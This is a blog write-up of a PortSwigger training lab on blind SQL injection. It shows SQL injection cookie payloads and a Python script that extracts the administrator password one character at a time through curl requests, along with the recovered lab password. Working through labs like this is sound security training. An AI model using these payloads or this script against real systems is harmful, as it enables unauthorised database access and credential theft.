+++
date = '2024-08-26T01:38:14+03:00'
draft = false
title = 'Blind SQLi Portswigger Conditional Responses'
description = 'A guide to exploiting a blind SQLi vulnerability using conditional responses in Portswigger with my python script.'
tags = ['sqli', 'portswigger', 'python', 'web']
+++

[Portswigger lab](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#)

# The Lab description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
# Understanding the lab
When i access the lab i find that it works normally till i hit the login or refresh it gives me a `Welcome Back` begind the login icon.
By analyzing the request i found out that there r two cookies
```header
Cookie: TrackingId=e2D1yRgn8a5Q8l8E; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5
```
contains `TrackingId` and `session`.

I assumed that the TrackingId is in an SQL query like `SELECT TrackingId FROM users WHERE TrackingId = <MY COOKIE>;`
So i started testing injecting in there to what happens to the posisive msg `Welcome Back`.
First when i change the id it doesn’t appear so the trackingid is essential.
Then opened burp repeater trying to add something like `...8E' OR '1'='2' --` make it doesn’t appear.
So started hunting.
I started testing the database data the site gave me about the lab 
`8E' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) > '0'--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5`

it worked and when changin the test to `< '0'` it doesn’t.
so at first i tried it manually found out that i will not finish so i used the most way i like… scripting.

I made this script to start getting the password
```python
# exploit.py
import subprocess

def getCmd(i, char, sign):
    link = "https://0af900ba04c11a3481b6b15700db0006.web-security-academy.net/"
    cookies = f"Cookie: TrackingId=e2D1yRgn8a5Q8l8E' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{i},1) {sign} '{char}'--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5" 
    return f"""curl -L "{link}" -H "{cookies}" """
i=1
password = ""
positive = "<div>Welcome back!</div><p>|</p>"

while True:
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        cmd = getCmd(i, char, '=')
        res = subprocess.run(cmd, shell=True, check=True, capture_output=True)
        if res.stdout.decode().find(positive) != -1:
            password += char
            print(f"Password: {password}")
            break
    i += 1
    if subprocess.run(getCmd(i, "", '='), shell=True, check=True, capture_output=True).stdout.decode().find(positive) != -1:
		print("Done!")
        break
```

Then launching get giving me
```python
$ python sqlGuessPassword.py
Password: y
Password: yq
Password: yqc
Password: yqcs
Password: yqcsv
Password: yqcsvs
Password: yqcsvsd
Password: yqcsvsd2
Password: yqcsvsd2d
Password: yqcsvsd2dy
Password: yqcsvsd2dyz
Password: yqcsvsd2dyzd
Password: yqcsvsd2dyzdc
Password: yqcsvsd2dyzdc3
Password: yqcsvsd2dyzdc3g
Password: yqcsvsd2dyzdc3gu
Password: yqcsvsd2dyzdc3gui
Password: yqcsvsd2dyzdc3guia
Password: yqcsvsd2dyzdc3guia4
Password: yqcsvsd2dyzdc3guia4g
Done
```

logging in and… Congratulations 😇

